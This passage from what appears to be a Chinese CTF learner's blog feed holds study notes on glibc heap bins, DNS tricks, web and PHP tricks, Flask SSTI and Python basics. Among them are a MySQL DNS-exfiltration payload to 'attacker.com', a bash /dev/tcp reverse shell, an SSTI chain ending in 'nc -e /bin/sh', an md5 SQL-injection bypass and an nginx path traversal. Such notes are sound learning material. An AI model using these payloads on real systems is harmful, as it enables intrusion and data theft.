  bins <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0xf7f977b0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0xf7f977b0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token number">0xf7f977b8</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0xf7f977b8</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token number">0xf7f977c0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0xf7f977c0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token number">0xf7f977c8</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0xf7f977c8</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">72</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token number">0xf7f977d0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0xf7f977d0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>真是醉了….<br>说是unsorted_bin是bin[1]…然而</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span>

<span class="token macro property">#<span class="token directive keyword">define</span> bin_at(m, i) \
(mbinptr) (((char *) &amp;((m)->bins[((i) - 1) * 2])) \
- offsetof (struct malloc_chunk, fd))</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>带进去算一下就可以知道…其实是 <code>main_arena -&gt; bins[0]</code> 存的就是<code>unsorted_bin</code>的<code>fd</code>, <code>main_arena -&gt; bins[1]</code>存的就是<code>unsorted_bin</code>的<code>bk</code></p>
<h3 id="gdb里"><a href="#gdb里" class="headerlink" title="gdb里"></a>gdb里</h3><pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ p <span class="token operator">*</span><span class="token punctuation">(</span>mfastbinptr<span class="token punctuation">)</span><span class="token number">0x804b000</span>
$<span class="token number">5</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  prev_size <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  size <span class="token operator">=</span> <span class="token number">0x91</span><span class="token punctuation">,</span> 
  fd <span class="token operator">=</span> <span class="token number">0xf7f97838</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">184</span><span class="token operator">></span><span class="token punctuation">,</span> 
  bk <span class="token operator">=</span> <span class="token number">0x804b0a0</span><span class="token punctuation">,</span> 
  fd_nextsize <span class="token operator">=</span> <span class="token number">0x41414141</span><span class="token punctuation">,</span> 
  bk_nextsize <span class="token operator">=</span> <span class="token number">0x41414141</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="malloc-amp-free"><a href="#malloc-amp-free" class="headerlink" title="malloc &amp; free"></a>malloc &amp; free</h3><p><code>_int_malloc</code></p>
<ol>
<li>是否fastbin, 看是否有合适大小的fastbin</li>
<li>是否smallbin, 看是否有合适大小的fastbin</li>
<li>如果没有合适的fastbin和smallbin, 就进行<code>consolidate fastbin -&gt; unsorted_bin</code></li>
<li>开始大循环</li>
</ol>
<p>如果…<code>unsorted_bin</code>中只有一个<code>last_remainder</code>.并且大小足够分, 就把这一块分一半给用户, 剩下的一块就是新的<code>last_remainder</code>, 再重新放入<code>unsorted_bin</code>…</p>
<p>大循环:<br>    反向寻找<code>unsorted_bin</code>, 最多找1w次…<br>    大小精确相等的, 就可以直接分配<br>    如果当前块是small bins, 就放到对应大小的smallbin的第一个位置<br>    如果是large bins, 就放到largebin的合适位置(因为large是一个范围, 大小排序好的)</p>
<p>所以…small_bin和large_bin都是从unsorted_bin取出来放进去的…</p>
<p>明天再写…这个循环有点迷</p>
<p><code>_int_free</code></p>
<ol>
<li>是否fastbin</li>
<li>是否mmap分配的, 如果是就用munmap</li>
<li>不然的话, 即使非mmap分配的small或者large, 就放入unsorted_bin</li>
</ol>
<p>free这里主要是各种检查</p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[dns | trick积累]]></title>
      <url>/2018/01/09/dns-trick%E7%A7%AF%E7%B4%AF/</url>
      <content type="html"><![CDATA[<p>DNS学习: <a href="http://momomoxiaoxi.com/2016/12/02/DNSQUICDNSSSC/" target="_blank" rel="external">http://momomoxiaoxi.com/2016/12/02/DNSQUICDNSSSC/</a></p>
<p>先上工具 ceye.io<br>今天看到dalao的wp利用到了这个…感觉真棒<br>因为一直没有VPS, QAQ, 看dalao每天dns外带数据什么的…<br>但…要绑手机号…QAQ…wtf</p>
<p>一些常用的使用技巧 <a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
<p>DNS利用一般用于盲注时候外带数据</p>
<blockquote>
<p>什么情况下, 只能用DNS外带数据, 不能用HTTP请求外带</p>
<ol>
<li>命令执行时候不能用curl, 只能ping ???</li>
<li></li>
</ol>
</blockquote>
<h3 id="DNS外带数据"><a href="#DNS外带数据" class="headerlink" title="DNS外带数据"></a>DNS外带数据</h3><p>mysql的payload</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> password <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span><span class="token operator">=</span><span class="token string">'root'</span> <span class="token keyword">LIMIT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.attacker.com\\foobar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其实我不太理解, 这里的<code>\\\\</code>是为了干啥, select一下<code>\\\\</code></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">mysql> select "\\\\";
+----+
| \\ |
+----+
| \\ |
+----+
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其他的参考: <a href="http://ceye.io/payloads" target="_blank" rel="external">http://ceye.io/payloads</a></p>
<p>有命令执行, sql注入, XXE, ….</p>
<p>再贴一篇[sql注入中用DNS获取数据]: <a href="http://wooyun.jozxing.cc/static/drops/tips-5283.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-5283.html</a></p>
<p>又找到一篇: <a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="external">https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/</a><br>上一篇的翻译版: <a href="http://www.mottoin.com/96463.html" target="_blank" rel="external">http://www.mottoin.com/96463.html</a></p>
<h3 id="DNS-预加载绕过CSP"><a href="#DNS-预加载绕过CSP" class="headerlink" title="DNS 预加载绕过CSP"></a>DNS 预加载绕过CSP</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span>”dns-prefetch”</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span>”hacker.com”</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>贴篇文章: <a href="https://www.anquanke.com/post/id/84803" target="_blank" rel="external">https://www.anquanke.com/post/id/84803</a></p>
<h3 id="DNS-rebinding-来-SSRF"><a href="#DNS-rebinding-来-SSRF" class="headerlink" title="DNS rebinding 来 SSRF"></a>DNS rebinding 来 SSRF</h3><p>这个…还是得…买个vps, 搞个域名</p>
<p>见33c3 list0r</p>
<h3 id="DNS-txt执行powershell"><a href="#DNS-txt执行powershell" class="headerlink" title="DNS txt执行powershell"></a>DNS txt执行powershell</h3><p><a href="http://wooyun.jozxing.cc/static/drops/tips-8971.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tips-8971.html</a></p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> dns </tag>
            
            <tag> trick </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python | Flask学习]]></title>
      <url>/2018/01/07/python-Flask%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>这不是魔法<br><a href="http://python.jobbole.com/80956/" target="_blank" rel="external">http://python.jobbole.com/80956/</a><br><a href="http://python.jobbole.com/80993/" target="_blank" rel="external">http://python.jobbole.com/80993/</a><br>主要讲了装饰器, 适合没学过python的, 像我一样的新手</p>
<p>来自Bendawang<br><a href="http://blog.csdn.net/qq_19876131/article/details/50830467" target="_blank" rel="external">http://blog.csdn.net/qq_19876131/article/details/50830467</a><br>后面这个结构我还是没懂 ==</p>
<p>补上import资料<br><a href="http://python.jobbole.com/82604/" target="_blank" rel="external">http://python.jobbole.com/82604/</a><br><a href="https://www.cnblogs.com/Lands-ljk/p/5880483.html" target="_blank" rel="external">https://www.cnblogs.com/Lands-ljk/p/5880483.html</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web | trick 积累]]></title>
      <url>/2018/01/05/web-trick-%E7%A7%AF%E7%B4%AF/</url>
      <content type="html"><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹到<code>127.0.0.1:6789</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">/bin/bash -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/6789 0<span class="token operator">></span><span class="token operator">&amp;</span>1
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Time-Based-RCE"><a href="#Time-Based-RCE" class="headerlink" title="Time Based RCE"></a>Time Based RCE</h3><p><a href="http://icematcha.win/?p=532" target="_blank" rel="external">http://icematcha.win/?p=532</a></p>
<h3 id="python-python-sandbox-bypass"><a href="#python-python-sandbox-bypass" class="headerlink" title="python | python sandbox bypass"></a>python | python sandbox bypass</h3><p><a href="http://icematcha.win/?p=725" target="_blank" rel="external">http://icematcha.win/?p=725</a><br><a href="https://winter3un.github.io/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/" target="_blank" rel="external">https://winter3un.github.io/2016/06/08/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4/</a></p>
<h3 id="php-md5-pass-true"><a href="#php-md5-pass-true" class="headerlink" title="php | md5($pass, true)"></a>php | md5($pass, true)</h3><pre class="line-numbers language-sql"><code class="language-sql">$sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM admin WHERE pass = '"</span><span class="token punctuation">.</span>md5<span class="token punctuation">(</span>$password<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>md5()第二个参数为true(默认false)的时候, 相当于执行了一次py里的<code>str.decode(&#39;hex&#39;)</code><br>一个广为流传的答案<code>ffifdyop</code> =&gt; <code>276f722736c95d99e921722cf9ed621c</code> =&gt; <code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code><br>就变成了<code>SELECT * FROM admin WHERE pass = &#39;&#39; or &#39;trash&#39;</code></p>
<blockquote>
<p>有一个坑点记录一下, 命令行里的echo默认是带换行的…所以<br>haibin@pc~$: echo ‘ffifdyop’ | md5sum 算出来的值不对…要去掉换行<br>haibin@pc~$: echo -n ‘ffifdyop’ | md5sum</p>
</blockquote>
<h3 id="node-Buffer-number-is-unsafe"><a href="#node-Buffer-number-is-unsafe" class="headerlink" title="node | Buffer(number) is unsafe"></a>node | Buffer(number) is unsafe</h3><p>node里Buffer(number)会泄露堆上的内存<br><a href="https://github.com/nodejs/node/issues/4660" target="_blank" rel="external">https://github.com/nodejs/node/issues/4660</a><br><a href="https://www.smrrd.de/nodejs-hacking-challenge-writeup.html" target="_blank" rel="external">https://www.smrrd.de/nodejs-hacking-challenge-writeup.html</a></p>
<h3 id="python-python-urllib-header注入"><a href="#python-python-urllib-header注入" class="headerlink" title="python | python urllib header注入"></a>python | python urllib header注入</h3><p>传说中的<code>CVE-2016-5699</code>: <a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a><br>在Redis上的利用: <a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/106</a></p>
<h3 id="padding-orcale"><a href="#padding-orcale" class="headerlink" title="padding orcale"></a>padding orcale</h3><p>session ctf 2016 | biscuiti</p>
<h3 id="cookie-amp-amp-同源策略"><a href="#cookie-amp-amp-同源策略" class="headerlink" title="cookie &amp;&amp; 同源策略"></a>cookie &amp;&amp; 同源策略</h3><p><a href="https://www.cnblogs.com/gg1234/p/5611086.html" target="_blank" rel="external">https://www.cnblogs.com/gg1234/p/5611086.html</a></p>
<p>cookie这个domain为什么最前面有个点: <a href="http://www.ietf.org/rfc/rfc2109.txt" target="_blank" rel="external">http://www.ietf.org/rfc/rfc2109.txt</a><br>没有点不应该接受<br>实际javascript设置的时候好像如果不加点设置了, 自己查看都会看到前面有个点, 所以是浏览器迁就了我们吗QAQ</p>
<p>应该是<code>xxx.abc.com</code> 设置cookie的时候</p>
<ol>
<li>能设置 <code>domain = &#39;.abc.com&#39;</code>, 然后遇到<code>yyy.abc.com</code>能读到这个cookie, <code>zzz.yyy.abc.com</code>就读不到了, 是不是这样子, QAQ</li>
<li>也能设置 <code>domain = &#39;.xxx.abc.com&#39;</code>, 这个时候<code>yyy.abc.com</code>也不能访问得到, 但<code>mmm.xxx.abc.com</code>可以访问得到, 是不是这样子, QAQ</li>
</ol>
<p>另外cookie的同源策略不判断 端口 &amp;&amp; 协议</p>
<h3 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h3><p><a href="http://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="external">http://blog.csdn.net/syh_486_007/article/details/51228628</a></p>
<h3 id="RPO"><a href="#RPO" class="headerlink" title="RPO"></a>RPO</h3><p>pwnhub | 忘了题叫啥<br>34c3-ctf | urlstorage<br>强网杯2018 | share your mind<br>利用条件大概有</p>
<ol>
<li>相对路径引入的css或者js, <code>/style.css</code>算绝对吗…<code>./style.css</code>和<code>style.css</code>应该都算是相对吧</li>
<li>网站用了一些url_rewrite, 使得访问<code>/index.php/static/xx.js</code>和访问<code>/index.php</code>返回相同的页面, 这就使得<code>index.php/a/b/c/..%2f..%2f..%2f</code>的时候, 服务器会认为这个url为<code>index.php</code>, 而浏览器请求静态文件的时候会认为<code>..%2f..%2f..%2f</code>是一个文件, 雾…看了一下好像这个是叫pathinfo模式<br>这里也有一篇文章 <a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="external">http://blog.nsfocus.net/rpo-attack/</a><br>好像是没有<code>&lt;!DOCTYPE html&gt;</code>就到了怪异模式…</li>
</ol>
<h3 id="nginx配置不当导致任意文件读取"><a href="#nginx配置不当导致任意文件读取" class="headerlink" title="nginx配置不当导致任意文件读取"></a>nginx配置不当导致任意文件读取</h3><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">location</span> <span class="token operator">/</span>static <span class="token punctuation">{</span>
        <span class="token keyword">alias</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>static<span class="token operator">/</span><span class="token punctuation">;</span>
        <span class="token keyword">autoindex</span> on<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问<code>http://ip/static../</code></p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="sqli里的反引号"><a href="#sqli里的反引号" class="headerlink" title="sqli里的反引号"></a>sqli里的反引号</h3><p>在可以用列名的时候, 使用效果可以作为注释…<br><a href="http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/" target="_blank" rel="external">http://www.yulegeyu.com/2017/04/11/%E4%B8%BA%E4%BB%80%E4%B9%88-backtick-%E8%83%BD%E5%81%9A%E6%B3%A8%E9%87%8A%E7%AC%A6/</a></p>
<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><p>正则的<code>.</code>不会匹配换行…, 所以<code>%0athis_isflag</code>不会匹配<code>.*this_is_flag</code>…</p>
<h3 id="补题计划"><a href="#补题计划" class="headerlink" title="补题计划"></a>补题计划</h3><p>~/plan-plan.md</p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python | flask SSTI学习]]></title>
      <url>/2018/01/05/python-flask-SSTI%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>上次AWD有一道模板注入…<br>我们利用的不好<br>而且等我们反应过来全场的…题目都挂了<br>检查了一下被写了<code>killall python</code>….真恐怖<br>由于前面有个nginx…挂了python很多人还没反应过来怎么了, 然后就没人修<br>然后我们没弹shell(不会弹), 就没法得分了</p>
<p>开始看到freebuf的文章,,,<br><a href="http://www.freebuf.com/articles/web/98619.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/98619.html</a><br><a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/98928.html</a></p>
<p>后来发现dalao写的更清楚..<br>原理和探索过程看dalao的blog<br><a href="http://klaus.link/2017/Flask_SSTI/" target="_blank" rel="external">http://klaus.link/2017/Flask_SSTI/</a></p>
<p>我就记录一下poc</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/tmp/evil'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'from os import system%0aSHELL = system'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">//</span>写文件
<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">.</span>from_pyfile<span class="token punctuation">(</span><span class="token string">'/tmp/evil'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">//</span>加载system
<span class="token punctuation">{</span><span class="token punctuation">{</span> config<span class="token punctuation">[</span><span class="token string">'SHELL'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'nc xxxx xx -e /bin/sh'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token operator">//</span>执行命令反弹SHELL
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php | trick 积累]]></title>
      <url>/2018/01/05/php-trick-%E7%A7%AF%E7%B4%AF/</url>
      <content type="html"><![CDATA[<h3 id="命令相关函数"><a href="#命令相关函数" class="headerlink" title="命令相关函数"></a>命令相关函数</h3><p>exec()<br>passthru()<br>shell_exec()<br>system()<br>pcntl_exec()<br>pcntl_fork()<br>proc_open()<br>popen()</p>
<p>即使命令执行函数都被禁止了, 也可以通过<code>glob</code>遍历一下目录</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"./*"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>  
    <span class="token keyword">echo</span> <span class="token variable">$item</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>phpjiami <a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html</a><br>php_screw  <a href="http://blog.csdn.net/water_cow/article/details/41872091" target="_blank" rel="external">http://blog.csdn.net/water_cow/article/details/41872091</a></p>
<h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h3><p><a href="http://www.mxny.org/post/ctf/2016-11-10" target="_blank" rel="external">http://www.mxny.org/post/ctf/2016-11-10</a><br><a href="http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html" target="_blank" rel="external">http://pupiles.com/%E8%B0%88%E8%B0%88parse_url.html</a><br>33c3 list0r 最后可以用<code>parse_url</code>和<code>curl</code>解析的不同绕过ssrf, 当然这题也可以DNS rebinding</p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>用<code>file_get_contents</code>和<code>file_put_contents</code>是最方便的</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"xxx.xxx"</span>

<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>

<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="二进制不安全函数"><a href="#二进制不安全函数" class="headerlink" title="二进制不安全函数"></a>二进制不安全函数</h3><p>远古php存在的经典的函数ereg系列(5.3之前?)<br><code>eregi()</code>和<code>ereg()</code>, 很久之前废除了, 存在00截断问题<br>应该是废除ereg换成preg系列函数的时候, include也不能00截断了<br>在网上看到一个其他的截断姿势: <a href="https://www.cnblogs.com/milantgh/p/5293628.html" target="_blank" rel="external">https://www.cnblogs.com/milantgh/p/5293628.html</a></p>
<h3 id="python-urllib-header注入"><a href="#python-urllib-header注入" class="headerlink" title="python urllib header注入"></a>python urllib header注入</h3><p>传说中的<code>CVE-2016-5699</code>: <a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html" target="_blank" rel="external">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a></p>
<p>在Redis上的利用: <a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/106</a></p>
<h3 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h3><p>php,php3,php4,php5,phtml</p>
<h3 id="绕过open-base"><a href="#绕过open-base" class="headerlink" title="绕过open_base"></a>绕过open_base</h3><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python | 装饰器]]></title>
      <url>/2018/01/04/python-%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      <content type="html"><![CDATA[<p><a href="http://python.jobbole.com/82344/" target="_blank" rel="external">http://python.jobbole.com/82344/</a><br><a href="https://www.zhihu.com/question/26930016" target="_blank" rel="external">https://www.zhihu.com/question/26930016</a><br><a href="http://python.jobbole.com/85056/" target="_blank" rel="external">http://python.jobbole.com/85056/</a></p>
<p>制作一个记录</p>
<p>顺带搭车理解<code>*arg, **kwargs</code>: <a href="http://blog.csdn.net/callinglove/article/details/45483097" target="_blank" rel="external">http://blog.csdn.net/callinglove/article/details/45483097</a></p>
<p>所以 <code>*arg</code> 相当于一个<code>可变长参数</code><br><code>**kwargs</code> 相当于<code>可变长参数键值对版</code> (==!wo yy de)</p>
<p>我还是感觉python面向对象很闹心==还是我太菜了…</p>
<blockquote>
<p>闭包 装饰器 生成器 </p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python | WSGI学习]]></title>
      <url>/2018/01/04/python-WSGI%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="http://python.jobbole.com/88653/" target="_blank" rel="external">http://python.jobbole.com/88653/</a></p>
<p>文章讲的很好了</p>
<p>WSGI 是 python 定义的</p>
<p>WSGI就是规定了server和application如何通信的协议(从Server端看)</p>
<p>这里server不是我们通常说的B/S和C/S里的server</p>
<p>可以认为是这样子(但愿我理解的对)</p>
<pre><code>+========+                     +=========================+
|Client  | ================&gt;   |        ===+WSGI+===     |
|Browser | &lt;================   | Server ===|协议|=== app |
+========+                     +=========================+
+B  or  C+                     |我们说的B/S或者C/S里面的S|
+--------+                     +-------------------------+
</code></pre><p>常见的Django, Flask 应该算是这里的app<br>但他们里面也有简单的Server(WSGIRefServer的封装应该是?)实现，所以自己也可以跑起来，生产环境则会搭配一些Server, 比如bjoern, gunicorn, uWSGI<br>所以这些web框架，一般会有几种不同的启动方式?</p>
<blockquote>
<p>Bottle, 只有一个文件的web框架</p>
<p>我怕是个傻子，才知道ipython的存在…</p>
</blockquote>
<p>这里有个turorial: <a href="http://wsgi.tutorial.codepoint.net/" target="_blank" rel="external">http://wsgi.tutorial.codepoint.net/</a></p>
<p>app端大致的定义</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">app</span><span class="token punctuation">(</span>environ<span class="token punctuation">,</span> start_response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    start_response<span class="token punctuation">(</span>status<span class="token punctuation">,</span> headers<span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">return</span> iterator

    <span class="token comment" spellcheck="true"># environ, start_response由Server调用app时候传入...放在js里大概是就是叫回调函数?</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>另外有一篇为什么要用ORM的: <a href="https://stackoverflow.com/questions/398134/what-are-the-advantages-of-using-an-orm" target="_blank" rel="external">https://stackoverflow.com/questions/398134/what-are-the-advantages-of-using-an-orm</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python | StringIO]]></title>
      <url>/2018/01/04/python-StringIO/</url>
      <content type="html"><![CDATA[<p>StringIO是用读写文件一样处理字符串</p>
<blockquote>
